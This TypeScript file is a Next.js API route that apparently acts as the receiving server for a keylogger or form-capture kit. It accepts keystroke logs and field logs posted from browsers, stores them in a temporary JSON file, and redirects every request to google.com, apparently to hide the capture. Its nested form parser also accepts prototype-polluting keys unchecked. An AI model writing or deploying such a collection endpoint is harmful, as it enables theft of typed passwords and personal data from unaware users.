import { NextResponse } from "next/server";
import { corsHeaders, deleteData } from "../route";
import fs from 'fs/promises';
import path from 'path';
import os from 'os'

const DATA_FILE_PATH = os.tmpdir() + '/latest-data.json';

export async function OPTIONS() {
  return NextResponse.json({}, { headers: corsHeaders });
}

function parseNestedFormData(formData: FormData): Record<string, any> {
  const result: Record<string, any> = {};

  for (const [key, value] of formData.entries()) {
    const keys = key
      .replace(/\]/g, '')
      .split('[');

    let current = result;

    for (let i = 0; i < keys.length - 1; i++) {
      const subKey = keys[i];
      if (!current[subKey] || typeof current[subKey] !== 'object') {
        current[subKey] = {};
      }
      current = current[subKey];
    }

    current[keys[keys.length - 1]] = value;
  }

  return result;
}

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    let parsedData = parseNestedFormData(formData);

    if (parsedData.LOGGER) {
      if (typeof parsedData.LOGGER.keylogs === 'string') {
        try {
          parsedData.LOGGER.keylogs = JSON.parse(parsedData.LOGGER.keylogs);
        } catch (e) {
          console.error('Erro ao parsear keylogs:', e);
        }
      }
      if (typeof parsedData.LOGGER.fieldlogs === 'string') {
        try {
          parsedData.LOGGER.fieldlogs = JSON.parse(parsedData.LOGGER.fieldlogs);
        } catch (e) {
          console.error('Erro ao parsear fieldlogs:', e);
        }
      }
    }

    await fs.writeFile(DATA_FILE_PATH, JSON.stringify(parsedData, null, 2));
    return Response.redirect('https://google.com');
  } catch (error: any) {
    console.error('Error writing file:', error);
    return Response.redirect('https://google.com');
  }
}
